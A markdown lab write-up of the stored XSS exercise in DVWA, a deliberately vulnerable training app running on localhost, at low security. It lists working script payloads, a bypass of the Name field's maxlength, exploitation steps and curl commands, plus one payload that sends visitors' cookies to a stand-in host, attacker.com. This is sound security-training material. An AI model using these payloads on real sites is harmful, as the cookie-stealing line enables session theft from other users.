# DVWA XSS (Stored) — Low Security

## URL
http://127.0.0.1:4280/vulnerabilities/xss_s/

## Vulnerable Parameters
- txtName (Name field)
- mtxMessage (Message field)
- Both are POST parameters in a guestbook form

## Form Details
- Method: POST
- Guestbook form with Name and Message fields
- Entries stored in database and displayed to all visitors
- Both fields reflected without sanitization

## Source Code Behavior (Low)
- Name: `trim($_POST['txtName'])`
- Message: `trim($_POST['mtxMessage'])`  
- Both inserted directly into `guestbook` table
- No escaping, no encoding on output

## Working Payloads

### In the Message field
```
<script>alert('XSS')</script>
```

### In the Name field (may have maxlength on client side)
```
<script>alert(1)</script>
```
Note: Name field has `maxlength="10"` in HTML — remove or bypass via intercepting request

### Cookie stealing (stored — affects every visitor)
```
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

## Step-by-Step Exploitation
1. Enter normal text in both fields — confirm entries are stored and displayed
2. In Message field, enter `<script>alert('XSS')</script>` — submit
3. Page reloads showing guestbook — alert fires
4. Every subsequent visit to this page triggers the XSS
5. For Name field: intercept POST request to bypass maxlength="10" HTML restriction

## curl Commands
```bash
# Stored XSS in message field
curl -X POST "http://127.0.0.1:4280/vulnerabilities/xss_s/" \
  -d "txtName=TestUser&mtxMessage=<script>alert('XSS')</script>&btnSign=Sign+Guestbook" \
  -b "PHPSESSID=<session>;security=low"

# Stored XSS in name field (bypassing maxlength)
curl -X POST "http://127.0.0.1:4280/vulnerabilities/xss_s/" \
  -d "txtName=<script>alert(1)</script>&mtxMessage=test&btnSign=Sign+Guestbook" \
  -b "PHPSESSID=<session>;security=low"
```

## Notes
- Stored XSS is more dangerous than reflected — persists and affects all visitors
- Client-side maxlength on Name field is trivially bypassed
- To clean up: reset the database via DVWA setup page
